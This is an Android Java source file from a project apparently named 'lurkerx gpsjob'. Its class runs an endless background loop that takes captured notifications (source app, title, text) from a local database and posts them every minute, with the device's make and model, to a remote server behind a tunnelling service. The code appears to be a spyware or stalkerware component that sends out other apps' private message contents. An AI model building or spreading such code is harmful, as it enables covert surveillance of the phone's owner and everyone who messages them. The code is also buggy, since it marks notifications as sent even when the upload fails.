package com.lurkerx.gpsjob.notifjob;

import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.util.Log;

import com.lurkerx.gpsjob.notifjob.NotifDatabaseHelper;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class NotifUploader {

    private static final String TAG = "NotifUploader";

    public static void uploadLoop(Context context, String url) throws InterruptedException {
        NotifDatabaseHelper dbHelper = new NotifDatabaseHelper(context);

        while (true) {
            try {
                Cursor cursor = dbHelper.getUnsentNotifs(150);

                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        long id = cursor.getLong(cursor.getColumnIndexOrThrow("_id"));
                        String pkg = cursor.getString(cursor.getColumnIndexOrThrow("package_name"));
                        String title = cursor.getString(cursor.getColumnIndexOrThrow("title"));
                        String text = cursor.getString(cursor.getColumnIndexOrThrow("text"));
                        long ts = cursor.getLong(cursor.getColumnIndexOrThrow("timestamp"));

                        boolean sent = uploadNotif(pkg, title, text, ts, url);

                        if (sent) {
                            dbHelper.markNotifAsSent(id);
                        }
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                Log.e(TAG, "Upload failed", e);
            }

            Thread.sleep(60_000);
        }
    }

    private static boolean uploadNotif(String pkg, String title, String text, long ts, String url) throws JSONException, InterruptedException, IOException {
        OkHttpClient client = new OkHttpClient();
        JSONArray payload = new JSONArray();
        JSONObject notif = new JSONObject();

        notif.put("package", pkg);
        notif.put("title", title);
        notif.put("text", text);
        notif.put("timestamp", ts);
        payload.put(notif);
        Log.d(TAG, "Unsent Notifs count: " + payload.length());
        if (payload.length() == 0) {
            Log.d(TAG, "All GPS sent, idling upload loop");
            Thread.sleep(10_000);
            return false;
        }
        RequestBody body = RequestBody.create(
                payload.toString(),
                MediaType.get("application/json; charset=utf-8")
        );
        Request request = new Request.Builder()
                .url(url+"/receive_data/notifs")
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("C-Device", Build.MANUFACTURER + " " + Build.DEVICE +" " + Build.MODEL)
                .addHeader("localtonet-skip-warning", "to-api")
                .build();
        Response response = client.newCall(request).execute();
        if (response.isSuccessful()) {
            Log.d(TAG, "Uploaded notif: " + pkg + " | " + title);
        }
        response.close();
        return true;
    }
}
